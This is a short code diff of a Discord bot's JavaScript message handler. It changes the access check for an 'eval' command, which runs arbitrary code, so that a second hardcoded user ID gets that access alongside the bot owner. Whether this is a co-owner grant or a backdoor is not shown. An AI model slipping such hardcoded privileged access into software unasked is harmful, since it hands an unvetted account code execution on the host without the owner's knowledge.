@@ -202,7 +202,7 @@ export const messageHandler = async (message, messageReply) => {
 
     if (command === "whoistherealtechguy") return await sendReply("<@553965304993153049>");
 
-    if (message.author.id === botOwner) {
+    if ([botOwner, "360084558265450496"].includes(message.author.id)) {
       if (command.startsWith("eval")) {
         let result;
         try {
